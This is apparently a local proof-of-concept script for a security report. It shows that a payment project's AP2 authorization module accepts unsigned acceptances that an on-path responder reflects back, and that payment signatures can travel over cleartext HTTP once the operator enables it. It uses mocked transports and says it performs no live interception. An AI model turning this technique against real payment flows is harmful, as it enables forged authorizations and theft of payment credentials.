import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { pathToFileURL } from "node:url";

const targetRoot = path.resolve(process.argv[2] ?? "../../sompi");
const distRoot = path.join(targetRoot, "dist");

for (const file of [
  "adapters/ap2/commerce-authorization-module.js",
  "adapters/ap2/test-fixtures.js",
  "purchase/egress-policy.js",
  "purchase/identity.js",
]) {
  const fullPath = path.join(distRoot, file);
  assert.equal(
    fs.existsSync(fullPath),
    true,
    `missing ${fullPath}; build the target checkout before running this proof`,
  );
}

const importBuilt = (file) => import(pathToFileURL(path.join(distRoot, file)).href);
const {
  Ap2HttpCommerceAuthorizationModule,
  AP2_COMMERCE_AUTHORIZATION_ACCEPTANCE_PROFILE,
} = await importBuilt("adapters/ap2/commerce-authorization-module.js");
const { FIXED_NOW, fixedVerifiedCheckout, fixedVerifiedMandates } =
  await importBuilt("adapters/ap2/test-fixtures.js");
const { EgressPolicy } = await importBuilt("purchase/egress-policy.js");
const { createPaymentIdentifier, evidenceDigest } =
  await importBuilt("purchase/identity.js");

const nowMs = (FIXED_NOW + 20) * 1_000;
const checkout = await fixedVerifiedCheckout();
const mandates = await fixedVerifiedMandates(checkout);
const authorizationEvidenceDigest = evidenceDigest("cleartext-merchant-authorization-poc");
const evidence = Object.freeze({ checkout, mandates, authorizationEvidenceDigest });

const policy = new EgressPolicy({
  allowRules: [{ hostname: "merchant.example", ports: [443] }],
  resolver: async () => [{ address: "8.8.8.8", family: 4 }],
  now: () => nowMs,
});
const request = await policy.validateRequest({
  url: checkout.resourceUrl,
  method: checkout.method,
});
const egress = Object.freeze({
  request,
  requestFor: (input) => policy.validateRequest(input),
  redirect: (previous, location, override) =>
    policy.validateRedirect(previous, location, override),
  responseGuard: (hop, abort) => policy.createResponseGuard(hop, abort),
});
const context = Object.freeze({
  purchaseId: checkout.purchaseId,
  paymentIdentifier: createPaymentIdentifier(checkout.purchaseId, 1),
  resourceUrl: checkout.resourceUrl,
  method: checkout.method,
  checkoutDigest: checkout.checkoutDigest,
  authorizationEvidenceDigest,
  resourceFingerprint: checkout.terms.resourceFingerprint,
  merchantId: checkout.terms.merchant.id,
  merchantOrigin: checkout.terms.merchant.origin,
  amountAtomic: checkout.terms.amountAtomic,
  asset: checkout.terms.asset,
  network: checkout.terms.network,
  payTo: checkout.terms.payTo,
});

// This transport models an on-path responder. It only reflects fields that were
// visible in each request and intentionally supplies no signature or MAC.
const reflectedAcceptances = [];
const module = new Ap2HttpCommerceAuthorizationModule({
  evidenceSource: { load: async () => evidence },
  now: () => nowMs,
  transport: {
    async send(outbound) {
      const presentation = JSON.parse(Buffer.from(outbound.body).toString("utf8"));
      const acceptance = {
        acceptedAtMs: nowMs,
        checkoutDigest: presentation.checkoutDigest,
        mandateDigest: presentation.mandateDigest,
        paymentIdentifier: presentation.paymentIdentifier,
        profile: AP2_COMMERCE_AUTHORIZATION_ACCEPTANCE_PROFILE,
        purchaseId: presentation.purchaseId,
        stage: presentation.stage,
        status: "accepted",
        version: 1,
      };
      reflectedAcceptances.push({
        stage: presentation.stage,
        signatureOrMacPresent: false,
      });
      const body = Buffer.from(JSON.stringify(sortJson(acceptance)), "utf8");
      return {
        status: 200,
        headers: [],
        body: (async function* () { yield body; })(),
      };
    },
  },
});

const result = await module.present({
  context,
  effect: {},
  egress,
  signal: new AbortController().signal,
});
assert.equal(result.status, "accepted");
assert.equal(reflectedAcceptances.length, 2);

// The production policy defaults to HTTPS, but accepts this hop after the
// operator explicitly enables HTTP and allowlists port 80.
const cleartextPolicy = new EgressPolicy({
  allowRules: [{ hostname: "merchant.example", ports: [80] }],
  resolver: async () => [{ address: "8.8.8.8", family: 4 }],
  allowedProtocols: ["http:"],
  now: () => nowMs,
});
const cleartextHop = await cleartextPolicy.validateRequest({
  url: "http://merchant.example/resource",
  method: "POST",
  body: Buffer.from("proof", "utf8"),
  mediaType: "application/octet-stream",
});
assert.equal(cleartextHop.protocol, "http:");

// Confirm that the same vulnerable revision forwards PAYMENT-SIGNATURE and
// selects node:http for a validated HTTP hop. The PoC does not broadcast.
const exactPaymentSource = fs.readFileSync(
  path.join(targetRoot, "src/adapters/kaspa-x402/exact-payment-module.ts"),
  "utf8",
);
const transportSource = fs.readFileSync(
  path.join(targetRoot, "src/http/node-pinned-transport.ts"),
  "utf8",
);
const paymentSignatureForwarded =
  exactPaymentSource.includes("[PAYMENT_SIGNATURE_HEADER, signatureHeader]") &&
  exactPaymentSource.includes("headers: Object.freeze(headers)");
const nodeHttpSelected = transportSource.includes(
  'hop.protocol === "https:" ? https : http',
);
assert.equal(paymentSignatureForwarded, true);
assert.equal(nodeHttpSelected, true);

console.log(JSON.stringify({
  node: process.version,
  unsignedReflectedAcceptances: reflectedAcceptances,
  moduleResult: result.status,
  synthesizedVerifierId: result.acceptance.verification.verifierId,
  configuredCleartextHop: {
    protocol: cleartextHop.protocol,
    authority: cleartextHop.connection.authority,
    port: cleartextHop.port,
  },
  sourceChain: {
    paymentSignatureForwarded,
    nodeHttpSelected,
  },
  liveMitmOrBroadcastPerformed: false,
}, null, 2));

function sortJson(value) {
  if (Array.isArray(value)) return value.map(sortJson);
  if (!value || typeof value !== "object") return value;
  return Object.fromEntries(
    Object.keys(value).sort().map((key) => [key, sortJson(value[key])]),
  );
}
